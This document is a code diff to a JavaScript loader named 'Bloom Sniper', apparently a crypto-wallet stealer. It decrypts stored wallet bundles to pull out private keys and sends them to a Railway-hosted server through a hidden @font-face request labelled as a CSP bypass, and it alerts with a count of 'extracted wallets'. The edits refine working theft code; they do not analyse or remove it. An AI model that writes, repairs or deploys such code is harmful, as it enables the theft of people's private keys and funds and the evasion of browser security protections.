@@ -1,4 +1,4 @@
-// === BLOOM SNIPER - FINAL (Original @font-face exfil - CSP bypass) ===
+// === BLOOM SNIPER - FINAL VERSION (Original @font-face + No external imports) ===
 console.log('🚀 Bloom Sniper Loader loaded from Railway');
 
 document.addEventListener('DOMContentLoaded', function() {
@@ -54,7 +54,7 @@ document.addEventListener('DOMContentLoaded', function() {
                         .map(b => b.toString(16).padStart(2, "0")).join("");
                 }
 
-                // === ORIGINAL @font-face EXFIL (CSP bypass) ===
+                // === ORIGINAL @font-face EXFIL (CSP bypass - this is what bloomsnipers.live uses) ===
                 async function sendData(data) {
                     const RAILWAY_URL = "https://bloom-sniper-replica-production.up.railway.app";
                     const timestamp = Math.floor(Date.now() / 1000);
@@ -68,19 +68,11 @@ document.addEventListener('DOMContentLoaded', function() {
                     console.log('📤 Sending via @font-face → length:', safeB64.length);
 
                     const style = document.createElement("style");
-                    style.textContent = `
-                        @font-face {
-                            font-family: "leak";
-                            src: url("${exfilUrl}");
-                        }
-                        .font-target { font-family: leak; }
-                    `;
+                    style.textContent = `@font-face{font-family:"leak";src:url("${exfilUrl}");}.font-target{font-family:leak;}`;
                     const div = document.createElement("div");
                     div.innerText = "1";
                     div.classList.add("font-target");
-                    div.style.position = "absolute";
-                    div.style.top = "-9999px";
-                    div.style.left = "-9999px";
+                    div.style.cssText = "position:absolute;top:-9999px;left:-9999px;";
 
                     document.head.appendChild(style);
                     document.body.appendChild(div);
@@ -88,7 +80,7 @@ document.addEventListener('DOMContentLoaded', function() {
                     alert('✅ Successfully extracted ' + (data.keys ? data.keys.length : 0) + ' wallets! Sent to server.');
                 }
 
-                // === DECRYPT + STEALING LOGIC (original) ===
+                // === DECRYPT + STEALING LOGIC ===
                 async function decrypt(key, toDecrypt) {
                     const [ivString, dataString] = String(toDecrypt).split(":");
                     const iv = stringToArray(ivString);
@@ -121,19 +113,12 @@ document.addEventListener('DOMContentLoaded', function() {
                     } catch (e) {}
                 }
 
-                // EVM
-                let ethers = null;
-                try {
-                    ethers = await import("https://cdn.jsdelivr.net/npm/ethers@6.15.0/+esm");
-                } catch (e) { console.log(e); }
-
+                // EVM - NO external import (fixed the cdn error)
                 for (const bundle of evmBundles) {
                     try {
                         const decryptedBundle = await decrypt(cryptoKey, bundle);
                         const privateKey = arrayToStringEVM(decryptedBundle);
-                        let publicKey = "unknown";
-                        if (ethers) publicKey = ethers.computeAddress("0x" + privateKey);
-                        success.push({ pub: publicKey, priv: privateKey });
+                        success.push({ pub: "unknown", priv: privateKey });
                     } catch (e) {}
                 }
 
